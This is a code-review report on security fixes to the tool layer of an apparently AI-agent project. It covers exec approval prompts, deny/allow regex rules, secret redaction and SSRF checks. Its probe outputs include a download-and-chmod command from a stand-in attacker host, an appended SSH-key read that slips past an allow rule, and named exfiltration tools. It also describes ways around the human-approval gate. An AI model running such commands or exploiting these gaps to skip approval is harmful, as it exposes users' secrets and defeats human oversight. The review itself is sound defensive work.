# internal/tools re-review (post fix-pass, uncommitted on 7927b6d)

Slice: `internal/tools/**`, `docs/security.md`, `go.mod`/`go.sum`.
Method: read the diff, then probed the live code with throwaway `_test.go`
files inside the package (deleted afterwards; `git status` for
`internal/tools` is back to the 11 modified files only). All quoted outputs
below are real run output, not reasoning.

Baseline checks: `go build ./...` OK, `go vet ./internal/tools/...` clean,
`go test -race -count=3 ./internal/tools/...` **ok 30.8s**, coverage 87.5%,
`go mod tidy` produces no further diff (go-shellwords removal is tidy; no
`shellwords` reference remains anywhere in the tree).

---

## Critical

### C1. A "y" typed after a timed-out prompt silently approves the *next* command
`internal/tools/approver.go:100,113,120-143` (single long-lived reader),
codified by `internal/tools/approver_test.go:187`.

`t.lines` is an unbuffered channel fed by one lifetime goroutine. After an
`Ask` returns on `waitCtx.Done()`, a line the human typed for *that* prompt
stays parked in the reader's pending send and is handed to whichever `Ask`
comes next — instantly, before the human can read the new prompt.

Probe (real output):

```
first ask (times out): err=context deadline exceeded
second ask approved=true err=<nil> after=123.121µs (prompt shown but never read by the human)
---- terminal transcript ----
[mtclaw] approval requested for tool "exec"
  command: ls /tmp
  (times out in 50ms) approve? [y/N]:
[mtclaw] no response in time; refusing

[mtclaw] approval requested for tool "exec"
  command: curl evil.example.com/x.sh -o /tmp/x && chmod +x /tmp/x
  (times out in 50ms) approve? [y/N]:
```

The human consented to `ls /tmp`; `curl … | chmod +x` ran. The pre-fix
behavior (per-Ask goroutine, answer dropped) failed **closed**; this fails
**open** on the one control the whole design calls "the real enforcement
boundary alongside deny". `TestTerminalApprover_TimedOutAskDoesNotStealTheNextAnswer`
does not catch it — it *asserts* it, framed as a feature ("an answer typed
after a timeout is not lost").

Fix: keep the single reader (that part is right), but make consent
per-prompt. Drain any pending line non-blockingly at the top of `Ask`,
before printing the prompt, and discard it:

```go
for {
    select {
    case <-t.lines: // stale input typed before this prompt was shown
        continue
    default:
    }
    break
}
```

and give `readLines` a small buffered channel so it is not parked mid-send
(a parked send is not drainable by the above). Then invert the test: a `y`
written after prompt #1 timed out must **not** approve prompt #2.

---

## High

### H1. `(?s)` was applied to the allow-list too, widening it across newlines
`internal/tools/policy.go:100` — `re, err := regexp.Compile("(?s)" + p)` in
`compileRules`, which compiles *both* `cfg.Deny` and `cfg.Allow`
(`policy.go:64,68`).

`(?s)` is load-bearing for deny (it is what makes the new line-continuation
must-catch cases work), but on allow it removes the implicit newline barrier
from any anchored pattern that uses `.`:

```
allow "^npm run .+$" vs "npm run build\ncat /home/me/.ssh/id_rsa": with(?s)=true without=false
verdict=VerdictRun audit=allowed_rule rule=^npm run .+$
```

A user who wrote `^npm run .+$` as a tight allow rule (exactly the "review
these like a firewall rule" advice in `docs/configuration.md:111`) now
auto-runs an appended second command with no prompt. Deny still fires for
deny-listed second lines, but `cat ~/.ssh/id_rsa`, `curl -T secrets host`,
`nc`, etc. are not on the deny list.

Fix: prefix `(?s)` only for the deny list (pass a flag to `compileRules`, or
compile deny via a `compileDenyRules` wrapper). Optionally also refuse
multi-line commands outright, or evaluate allow per physical line.

### H2. A second approval after stdin EOF hangs for the full `approval_timeout`
`internal/tools/approver.go:113` (`t.errs <- err; return`) vs the comment at
`approver.go:106-108` claiming "a later Ask on a closed input will then also
see that same terminal error via t.errs".

The error is sent exactly once and the goroutine exits; `t.errs` is empty
forever after. Probe:

```
ask1 approved=false err=tools: read approval response: EOF after=152.36µs
ask2 approved=false err=context deadline exceeded after=700.632163ms   (= the full Timeout)
```

With the shipped default `approval_timeout: 5m`
(`internal/config/defaults.go:56`), `mtclaw prompt` with piped/closed stdin
now blocks the turn for 5 minutes per approval instead of failing
immediately as it did before the fix pass. Verdict is still fail-closed, so
this is availability, not bypass.

Fix: record the terminal error in a field and close `t.errs` (or close a
`done` channel) instead of a single send, so every subsequent `Ask` returns
it at once. The code comment is currently factually wrong either way.

### H3. Deny normalization produces new permanent refusals for ordinary quoted commands
`internal/tools/policy.go:122-135` (`normalizeForDeny` + the
`|| rule.re.MatchString(normalized)` arm), amplified by the new `(` in the
`rm` boundary class (`internal/tools/deny_defaults.go:16-17`).

Quotes are stripped everywhere in the string, not just around the command
word, so any quoted *argument* that happens to contain `rm -r…` becomes a
deny match. A deny match is permanent and explicitly **not** overridable by
approval, so the user's only escape is editing the regex out of their
config. Probe (`denied` = final verdict, `rawMatch` = matched before
normalization):

```
"grep \"rm -rf\" install.sh"          denied=true  rawMatch=false
"grep -n 'rm -r' *.md"                denied=true  rawMatch=false
"cat \"my 'rm -rf' notes.txt\""       denied=true  rawMatch=false
"ls \"/data/rm -rf backups\""         denied=true  rawMatch=false
"python3 -c \"print('rm -rf')\""      denied=true  rawMatch=false
```

All five are read-only and all five were *askable* before the fix pass.
`mustNotCatchPOSIX()` (`policy_test.go:232-246`) contains no quoted-argument
case at all, which is why this passed CI. (The analogous PowerShell cases I
probed — `Select-String -Pattern "del /f"`, `git commit -m "remove-item
-recurse cleanup"` — are `rawMatch=true`, i.e. pre-existing, not caused by
this pass.)

Fix: normalize only the command-word position rather than the whole string,
e.g. strip quotes/backslashes only in the leading token of each `;`/`&&`/`|`
segment, and add the five strings above to `mustNotCatchPOSIX()`.

Note the reverse side of the same coin: `docs/security.md:94-95` states
`sh -c 'rm -rf /'`, `bash -c "..."` and `eval "..."` "remain an accepted,
documented bypass". That is no longer true — normalization strips the quotes
and all three are refused (`denied=true rawMatch=false` for
`sh -c 'rm -rf /'`, `bash -c "rm -rf /tmp/x"`, `eval "rm -rf /tmp/x"`). Safe
direction, wrong documentation; fix the doc or the normalization scope
together, since both stem from normalizing the whole string.

---

## Medium

### M1. `RedactSecrets` lost the punctuation-prefixed `token=`/`key=` shapes
`internal/tools/approver.go:213`. The old rule was
`(?i)\b(KEY|TOKEN|SECRET|PASSWORD)=(\S+)`; the new one requires the keyword
to be preceded by start-of-string or one of `[\s;&|"'=]`. `?`, `-`, `.`, `/`
are no longer accepted, so URL query credentials regress:

```
IN : curl "https://api.example.com/v1?token=SECRET123"
NEW: curl "https://api.example.com/v1?token=SECRET123"   (leaks into prompt + exec_audit)
OLD: curl "https://api.example.com/v1?token=[REDACTED]"
```

Same for `-Dtoken=…` (missed by both) and `--api-key=…` (old caught it via
`\bkey=`, new does not). Fix: allow any non-`[A-Za-z0-9_]` character (or a
`(?:^|[^A-Za-z0-9_])` prefix) instead of the closed class, keeping the new
suffix matching.

### M2. Dropping `/` from the base64 class loses real AWS-style secrets
`internal/tools/approver.go:223` (`\b[A-Za-z0-9+]{32,}={0,2}\b`).

```
IN : aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
OLD: aws configure set aws_secret_access_key [R]
NEW: aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

A 40-char base64 secret containing `/` now splits into sub-32 runs and
survives. The gain it bought (long paths no longer redacted,
`TestRedactSecrets_LongPathSurvivesRedaction`) is real but cheaper to get by
requiring the run to be `/`-containing *and* not path-shaped, or by keeping
`/` in the class and excluding runs preceded by `/` `.` `-`. At minimum this
trade should be a documented decision, not a silent one — `docs/security.md`
still advertises "long base64/hex runs".

### M3. `registerExecTool`'s secret-env wiring is untested; only the field is
`internal/tools/exec.go:74-80` reads `cfg.OpenAI.APIKeyEnv` and
`cfg.Channels.Telegram.TokenEnv`, but the only test
(`exec_test.go:282`) sets `et.secretEnvNames = []string{"MTCLAW_TEST_SECRET"}`
directly. Nothing proves the config-to-field wiring; a typo'd field
reference (or a future third secret env) would ship silently. Fix: one test
that builds the tool through `registerExecTool` with a config naming an env
var and asserts the child cannot echo it.

### M4. `filterEnv` is case-sensitive; env names are case-insensitive on Windows
`internal/tools/exec.go:338-356`. Probe:

```
strip SECRET: [A=1 B=2 SECRETS=y NOEQ =weird secret=lower]   <- "secret=lower" survives
```

On POSIX that is correct. On Windows, `api_key_env: openai_api_key` against
a real `OPENAI_API_KEY=` entry would leave the key in the child's
environment while the code and `docs/security.md:174-180` both claim it is
stripped. Fix: fold case on `runtime.GOOS == "windows"`.

---

## Low

### L1. `runeSafeLen` is unbounded, contrary to its own claim
`internal/tools/approver.go:176-185` (the implementer's report says "bounded
to at most 3 iterations"). It walks back over *every* invalid byte:

```
runeSafeLen(900 x 0xff) = 0
RedactSecrets(900 x 0xff) = "... [truncated; command is longer]"
```

The whole displayed/audited command can be erased when the command string is
not valid UTF-8, and `exec.go:233` can in principle erase captured output
the same way. Fix: stop after at most `utf8.UTFMax-1` steps and keep the raw
cut otherwise.

### L2. `capWriter` is safe only because of an os/exec implementation detail
`internal/tools/exec.go:220-221` assigns the same `*capWriter` to `Stdout`
and `Stderr`. os/exec dedupes this — `os/exec/exec.go:581`:
`if c.Stderr != nil && interfaceEqual(c.Stderr, c.Stdout) { return childStdout, nil }`
— so one goroutine copies from one pipe and there is no concurrent write
(confirmed: 300 interleaved stdout/stderr lines under `-race`, clean; and
`Wait`→`awaitGoroutines` always joins the copier, including the WaitDelay
path, so reading `out.buf`/`out.over` after `Run` is ordered). But the
guarantee lives in the stdlib, not here. One sentence in the `capWriter`
doc-comment ("must be the identical writer value for both streams"), or a
`sync.Mutex`, would keep a future `cmd.Stderr = &capWriter{...}` from
introducing a silent race.

### L3. SSRF: IPv4-compatible IPv6 (`::a.b.c.d`) is not decoded
`internal/tools/web_fetch.go:128-137`. NAT64 (`64:ff9b::/96`) and 6to4
(`2002::/16`) are handled correctly (verified: `64:ff9b::7f00:1` blocked,
`64:ff9b::808:808` allowed, `2002:7f00:1::` blocked). The deprecated
`::127.0.0.1` form is not: `Unmap()` only handles `::ffff:`, and `b[:12]`
zeros match neither prefix, so `isBlockedAddr` returns false. Practically
unroutable on Linux, but it is the same class as the two cases just fixed.
Also unhandled: Teredo (`2001::/32`) and the RFC 8215 local-use NAT64 prefix
`64:ff9b:1::/48`.

### L4. Content-Type gate skips a few textual types
`internal/tools/web_fetch.go:234-250`. `application/json` (incl. `; charset=`)
and missing header are handled correctly (verified by the new tests).
`application/xml`, `application/*+json` (`application/vnd.api+json`),
`application/javascript`, `application/x-ndjson` are refused as "binary".
Suggest a suffix check for `+json`/`+xml` and adding `application/xml`.
Also: the body is fully downloaded before the gate runs, so the gate saves
model context, not bandwidth — worth saying in the comment, since the
comment reads like a fetch-time protection.

### L5. `read_file` still allocates the full clamped limit
`internal/tools/fs.go:122` `buf := make([]byte, limit)` allocates
`max_read_bytes` (default 256 KiB, configurable to anything) even for a
5-byte file. The new `limit <= 0` guard above it is correct but unreachable
through a validated config (`internal/config/validate.go:155` rejects
`max_read_bytes < 1`), so its test only exercises a hand-built `fsTools`.
Fine as defense in depth; just do not read that test as coverage of a real
path. Cheap improvement: `min(limit, info.Size()-offset)`.

### L6. `list_dir` returns both a message and an error
`internal/tools/fs.go:272-275` returns `("list_dir: canceled", err)` while
`readFile`/`writeFile` return `("", err)`. Harmless today (callers that get
a non-nil error ignore the string) but inconsistent; pick one.

---

## Prior fixes: verified / not verified

| Claim (implementer report) | Status | Evidence |
|---|---|---|
| H1 tokenize gate removed, deny runs first | verified | `exec.go:133` calls `Evaluate` unconditionally; `(rm -rf ~) &` → `VerdictRefuse`, approver not called |
| `(` added to `rm` boundary class | verified, with side effect | catches the subshell case; also contributes to H3 false positives via normalization |
| H2 write-time output cap, `truncated` = `over` | verified | `yes | head -c 2000000` at cap 100 → body ≤ 100, marker present; no race, see L2 |
| H3 `RedactSecrets` env-assignment widened | partially verified | `*_KEY=`/`*_TOKEN=` gains real (M1 regression for `?token=`, `--api-key=`) |
| H3 base64 class narrowed to drop `/` | verified, regression | path survives, AWS-shaped secret now leaks (M2) |
| H4 single reader goroutine, no per-Ask leak | verified mechanically, **wrong behavior** | one goroutine per approver, never leaks per Ask; but C1 (stale consent) and H2 (EOF hang) |
| M1/M2 `(?s)` + normalization catch continuations/quoting | verified for deny, **over-applied** | line-continuation and `'rm'`/`\rm` cases denied; H1 (allow widened), H3 (false positives) |
| M3 child env scrubbing | verified | `echo $VAR` returns `[]` in child; wiring untested (M3), Windows case gap (M4) |
| M6 shared `runeSafeLen`, "at most 3 iterations" | behavior verified, claim false | rune-safe cuts work; unbounded backtrack (L1) |
| fs ctx plumbing + read clamp | verified | canceled ctx returns `context.Canceled` from `readFile`/`listDir`; `walkDir` bails mid-walk |
| SSRF residual ranges, NAT64/6to4 embedding | verified | all 9 matrix cases reproduce, incl. the two public-IPv4 negatives; gap L3 |
| Content-Type gate | verified | png skipped, `application/json; charset=utf-8` passed; gaps L4 |
| `go mod tidy` stable, go-shellwords gone | verified | `go mod tidy` re-run produces no additional diff; zero `shellwords` references |
| docs/security.md matches code | mostly; one wrong claim | `sh -c`/`eval` bypass statement is now false (H3) |

## Metrics

- `go test -race -count=3 ./internal/tools/...`: pass (30.8s)
- coverage: 87.5% of statements (`internal/tools`)
- `go vet`, `gofmt`, `go build ./...`: clean
- lint issues found by me: 0 style, 6 behavioral (above)

## Unresolved questions

1. Is a permanent, non-overridable refusal the intended outcome for
   `grep "rm -rf" file` (H3)? If yes, it belongs in
   `acceptedFalsePositivesPOSIX()` and in `docs/security.md`, not in silence.
2. Was applying `(?s)` to the *allow* list deliberate (H1)? Nothing in the
   task list or the report mentions the allow side.
3. C1 is asserted as intended behavior by a new test. Confirm the product
   intent: consent is per-prompt (my reading) or per-session ("do not lose a
   late answer")? If the latter, at minimum the second prompt must be
   re-displayed and the carried-over answer echoed.

Status: DONE_WITH_CONCERNS
Summary: The fix pass closes the tokenize-gate bypass and the output/memory, env-leak, SSRF and ctx findings for real, but introduces one approval-bypass regression (a timed-out prompt's "y" approves the next command, asserted as a feature by a new test), widens the allow-list across newlines via a blanket `(?s)`, hangs 5 minutes per approval after stdin EOF, and trades two known RedactSecrets shapes for the new ones.
Concerns/Blockers: C1 and H1 are approval-bypass class and should block landing; H2/H3 are user-visible regressions; docs/security.md's `sh -c`/`eval` bypass claim is now false.
